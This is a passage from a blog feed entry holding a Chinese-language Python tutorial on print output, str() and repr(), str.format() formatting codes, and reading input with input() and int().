color="#FF7F00"><strong>空行也是程序代码的一部分</strong></font>。</li></ol></blockquote><p>什么是空行？</p><pre class="line-numbers language-python"><code class="language-python">a<span class="token operator">=</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">3</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">#这里就是空行</span>b<span class="token operator">=</span>a<span class="token operator">+</span><span class="token number">3</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="七-输出-print"><font color="#FF6347" face="Comic sans MS">七. 输出(print)</font><a href="post/Python-Grammar#七-输出-print"></a></h3><p>Python3.0以后的输出使用<code>print()</code>函数。分为<strong>换行输出</strong>和<strong>不换行输出</strong>。<br>在print()括号中加上字符串，就可以向屏幕上输出指定的文字。括号里还可以放表达式等……</p><blockquote><ol><li><strong>换行输出：</strong><font color="#FF7F00"><strong>print 默认输出是换行的</strong></font></li><li><strong>不换行输出：</strong>将括号里的所有参数输出在一行，只需要<font color="#FF7F00"><strong>在每一个参数后面加一个<code>,</code></strong></font>即可。<strong>注意：</strong><ol><li>最后一个参数后面没有<code>,</code>，也就是和普通函数使用一样；</li><li>参数中间的<code>,</code>输出来是一个空格。如下：</li></ol></li><li>循环输出变量b的时候如果不换行，可在后面加个<code>end=&#39; &#39;</code>，即<code>print(b, end=&#39; &#39;)</code></li></ol></blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Thequickbrownfox'</span><span class="token punctuation">,</span> <span class="token string">'jumpsover'</span><span class="token punctuation">,</span> <span class="token string">'thelazydog'</span><span class="token punctuation">)</span>运行结果：Thequickbrownfox jumpsover thelazydog <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="7-1-输出的补充"><font color="#3CB371" face="Comic sans MS">7.1 输出的补充</font><a href="post/Python-Grammar#7-1-输出的补充"></a></h4><blockquote><p><font face="Microsoft YaHei" color="#FF7F00">Python的三种输出：</font></p><ol><li><font face="Microsoft YaHei">Python两种输出值的方式: 表达式语句和<code>print()</code>函数；</font><ol><li><font face="Microsoft YaHei">如果你希望输出的形式更加多样，可以使用 <code>str.format()</code> 函数来格式化输出值。</font></li><li><font face="Microsoft YaHei">如果你希望将输出的值转成字符串，可以使用 <code>repr()</code> 或 <code>str()</code> 函数来实现</font>.</li></ol></li><li><font face="Microsoft YaHei">第三种方式是使用文件对象的<code>write()</code> 方法，标准输出文件可以用<code>sys.stdout</code>引用</font>！</li></ol></blockquote><br><h4 id="7-2-输出时常用的函数"><font color="#3CB371" face="Comic sans MS">7.2 输出时常用的函数</font><a href="post/Python-Grammar#7-2-输出时常用的函数"></a></h4><ul><li><font color="#FF7F00"><strong>str()：</strong></font> 将对象转化为适于人阅读的形式，函数返回一个对象的string格式。</li><li><font color="#FF7F00"><strong>repr()：</strong></font> 将对象转化为供解释器读取的形式，返回一个对象的 string 格式。可以输出包括转义字符在内的所有字符！</li><li><font color="#FF7F00"><strong><code>end=&#39; &#39;</code>：</strong></font> 循坏输出时常用于不换行输出。</li><li><font color="#FF7F00"><strong>str.format() ：</strong></font>格式化输出。</li></ul><br><p>举例：</p><pre class="line-numbers language-python"><code class="language-python">x <span class="token operator">=</span> <span class="token string">"'abcd\ne\nfg'"</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>repr<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>output：'abcdefg'<span class="token string">"'abcd\ne\nfg'"</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token triple-quoted-string string">'''repr() 的参数可以是 Python 的任何对象'''</span>x <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">3.25</span>y <span class="token operator">=</span> <span class="token number">200</span> <span class="token operator">*</span> <span class="token number">200</span><span class="token keyword">print</span><span class="token punctuation">(</span>repr<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>output： <span class="token punctuation">(</span><span class="token number">32.5</span><span class="token punctuation">,</span> <span class="token number">40000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token triple-quoted-string string">'''  我们都知道正常情况下将多个字符串输出在一行直接使用半角逗号,分隔即可。但是循坏输出要想不换行就得使用 end=' '了  '''</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> a<span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n----------分隔符-----------'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> y <span class="token keyword">in</span> a<span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n----------分隔符-----------'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> y <span class="token keyword">in</span> a<span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n----------分隔符-----------'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> y <span class="token keyword">in</span> a<span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>OUTPUT：<span class="token number">1</span><span class="token number">2</span><span class="token number">3</span><span class="token number">4</span><span class="token number">5</span><span class="token number">6</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>分隔符<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">123456</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>分隔符<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>1w2w3w4w5w6w<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>分隔符<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="7-3-str-format-格式化字符串"><font color="#3CB371" face="Comic sans MS">7.3 str.format()格式化字符串</font><a href="post/Python-Grammar#7-3-str-format-格式化字符串"></a></h4><p>旧式的格式化输出在<font color="#00B2EE">[<a href="https://directoree.top/post/Python-Grammar" target="_blank" rel="noopener">Python-基础语法</a>]</font>里面讲过，这里的<code>str.format()</code>就是新版的格式化的一种形式。</p><p><strong>语法：</strong>字符串类型格式化采用format()方法，基本使用格式是：<br><font color="#FF7F00"><strong>&lt;模板字符串&gt;.format(&lt;逗号分隔的参数&gt;)</strong></font></p><p>所谓的<strong>str.format()</strong>：即<code>.format()</code>前是一个字符串，字符串里面有<code>{}</code>相当于旧书式的<code>%</code>。<code>{}</code>及其里面的字符 (称作格式化字段) 将会被 format() 中的参数替换。分为以下几种使用方法：</p><br><ol><li>在括号中的<font color="#FF7F00"><strong>数字</strong></font>用于指向传入对象在 format() 中的<font color="#FF7F00"><strong>索引位置</strong></font>，如下所示：</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0} 和 {1}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{1} 和 {0}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>OUTPUT：Google 和 RunoobRunoob 和 Google<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><ol start="2"><li>在 format() 中使用了<font color="#FF7F00"><strong>关键字参数, 那么它们的值会指向使用该名字的参数</strong></font>。也可以位置及关键字参数可以任意的结合:</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0} 和 {1}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{1} 和 {0}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'站点列表 {0}, {1}, 和 {other}。'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span>                                                       other<span class="token operator">=</span><span class="token string">'Taobao'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>OUTPUT：Google 和 RunoobRunoob 和 Google站点列表 Google<span class="token punctuation">,</span> Runoob<span class="token punctuation">,</span> 和 Taobao。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><ol start="3"><li>在 <code>{}</code> 里使用 <code>!a</code> (使用 ascii()), <code>!s</code>(使用 str()) 和 <code>!r</code> (使用 repr()) 可以用于<font color="#FF7F00"><strong>在格式化某个值之前对其进行转化</strong></font>:</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> math<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'常量 PI 的值近似为： {}。'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'常量 PI 的值近似为： {!s}。'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span>OUTPUT<span class="token punctuation">:</span>常量 PI 的值近似为： <span class="token number">3.141592653589793</span>。常量 PI 的值近似为： <span class="token number">3.141592653589793</span>。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><ol start="4"><li>可选项 <code>:</code> 和格式标识符可以跟着字段名。 这就允许对值进行更好的格式化。</li></ol><p>format()方法中&lt;模板字符串&gt;的<code>{}</code>除了包括参数序号，还可以包括格式控制信息。此时，<code>{}</code>的内部样式如下：</p><p><font color="#FF7F00">     <strong>{&lt;参数序号&gt;: &lt;格式控制标记&gt;}</strong>  </font></p><p>其中，&lt;格式控制标记&gt;用来控制参数显示时的格式，包括：<strong>&lt;填充&gt;&lt;对齐&gt;&lt;宽度&gt;,&lt;.精度&gt;&lt;类型&gt;</strong> 6 个字段，这些字段都是可选的，可以组合使用，逐一介绍如下。参考：<font color="#00B2EE">[<a href="https://blog.csdn.net/i_chaoren/article/details/77922939" target="_blank" rel="noopener">Python字符串格式化–format()方法</a>]</font></p><div class="article-img"><p><img src="https://i.loli.net/2019/03/06/5c7f917b8902b.jpg" alt="1.jpg" data-zoomable></p></div><br><p><strong>&lt;宽度&gt;</strong><br>指当前槽的设定输出字符宽度，如果该槽对应的format()参数长度比&lt;宽度&gt;设定值大，则使用参数实际长度。如果该值的实际位数小于指定宽度，则位数将被默认以空格字符补充。</p><p><strong>&lt;对齐&gt;</strong><br>指参数在&lt;宽度&gt;内输出时的对齐方式，分别使用&lt;、&gt;和^三个符号表示左对齐、右对齐和居中对齐。</p><p><strong>&lt;填充&gt;</strong><br>指&lt;宽度&gt;内除了参数外的字符采用什么方式表示，默认采用空格，可以通过&lt;填充&gt;更换。</p><pre class="line-numbers language-python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"PYTHON"</span><span class="token string">"{0:30}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>s<span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'PYTHON                        '</span><span class="token string">"{0:>30}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>s<span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'                        PYTHON'</span><span class="token string">"{0:*^30}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>s<span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'************PYTHON************'</span><span class="token string">"{0:-^30}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>s<span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'------------PYTHON------------'</span><span class="token string">"{0:3}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>s<span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'PYTHON'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><strong>逗号（，）</strong><br>&lt;格式控制标记&gt;中逗号（，）用于显示数字的千位分隔符，例如：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token string">"{0:-^20,}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">1234567890</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'---1,234,567,890----'</span><span class="token string">"{0:-^20}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">1234567890</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#对比输出</span>Out<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'-----1234567890-----'</span><span class="token string">"{0:-^20,}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">12345.67890</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'----12,345.6789-----'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><strong>&lt;.精度&gt;</strong><br>表示两个含义，由小数点（.）开头。对于浮点数，精度表示小数部分输出的有效位数。对于字符串，精度表示输出的最大长度。</p><p><strong>&lt;类型&gt;</strong><br>表示输出整数和浮点数类型的格式规则。对于整数类型，输出格式包括6 种：</p><ul><li>b: 输出整数的二进制方式；</li><li>c: 输出整数对应的 Unicode 字符；</li><li>d: 输出整数的十进制方式；</li><li>o: 输出整数的八进制方式；</li><li>x: 输出整数的小写十六进制方式；</li><li>X: 输出整数的大写十六进制方式；</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> table <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Google'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> name<span class="token punctuation">,</span> number <span class="token keyword">in</span> table<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0:10} ==> {1:10d}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>name<span class="token punctuation">,</span> number<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Runoob     <span class="token operator">==</span><span class="token operator">></span>          <span class="token number">2</span>Taobao     <span class="token operator">==</span><span class="token operator">></span>          <span class="token number">3</span>Google     <span class="token operator">==</span><span class="token operator">></span>          <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于<strong>浮点数类型</strong>，输出格式包括4 种：</p><ul><li>e: 输出浮点数对应的小写字母 e 的指数形式；</li><li>E: 输出浮点数对应的大写字母 E 的指数形式；</li><li>f: 输出浮点数的标准浮点形式；</li><li>%: 输出浮点数的百分形式。</li></ul><br><ol start="5"><li>如果你有一个很长的格式化字符串, 而你不想将它们分开, 那么在格式化时通过变量名而非位置会是很好的事情。</li></ol><p>最简单的就是传入一个字典, 然后使用方括号 <code>[]</code> 来访问键值 :</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> table <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Google'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Runoob: {0[Runoob]:d}; Google: {0[Google]:d}; Taobao: {0[Taobao]:d}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span>Runoob<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">;</span> Google<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span> Taobao<span class="token punctuation">:</span> <span class="token number">3</span>也可以通过在 table 变量前使用 <span class="token string">'**'</span> 来实现相同的功能：<span class="token operator">>></span><span class="token operator">></span> table <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Google'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Runoob: {Runoob:d}; Google: {Google:d}; Taobao: {Taobao:d}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token operator">**</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span>Runoob<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">;</span> Google<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span> Taobao<span class="token punctuation">:</span> <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="八-输入-input"><font color="#FF6347" face="Comic sans MS">八. 输入(input)</font><a href="post/Python-Grammar#八-输入-input"></a></h3><blockquote><ol><li>函数input()让程序暂停运行，等待用户输入一些文本。获取用户输入后，Python将其存储在一个变量（指针）中，以方便你使用。</li><li>input()函数有个返回值，<font color="#FF7F00"><strong>返回类型为String</strong></font>。</li></ol></blockquote><br><p><font color="red"><strong>一、参数</strong></font></p><p>输入分为两种：<strong>空参数</strong>、<strong>带有参数</strong>。</p><p><font color="#00B2EE"><strong>空参数：</strong></font><code>input()</code>；效果是屏幕上没有任何提示，等待用户输入。<br><font color="#00B2EE"><strong>带有参数：</strong></font><code>input(&#39;请输入一个字符串：&#39;)</code>；效果是屏幕上显示“请输入一个字符串：”，然后等待用户输入。</p><p><font color="red"><strong>二、返回值</strong></font></p><p>关于input()的返回值，是<font color="#FF7F00"><strong>字符串String类型</strong></font><br>如下会报错，假如输入1998，返回给s的值是字符串”1998”，如果直接和数字型进行比较会报错：</p><pre class="line-numbers language-python"><code class="language-python">s <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'birth: '</span><span class="token punctuation">)</span>birth <span class="token operator">=</span> s<span class="token keyword">if</span> birth <span class="token operator">&lt;</span> <span class="token number">2000</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'00前'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'00后'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>解决方法是使用函数<code>int(str)</code>，功能是<font color="#FF7F00"><strong>将字符串类型转换成数字型</strong></font>。</p><pre class="line-numbers language-python"><code class="language-python">s <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'birth: '</span><span class="token punctuation">)</span>birth <span class="token operator">=</span> int<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">if</span> birth <span class="token operator">&lt;</span> <span class="token number">2000</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'00前'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'00后'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-基础</title>
      <link href="/post/Python-Basics/"/>
      <url>/post/Python-Basics/</url>
      
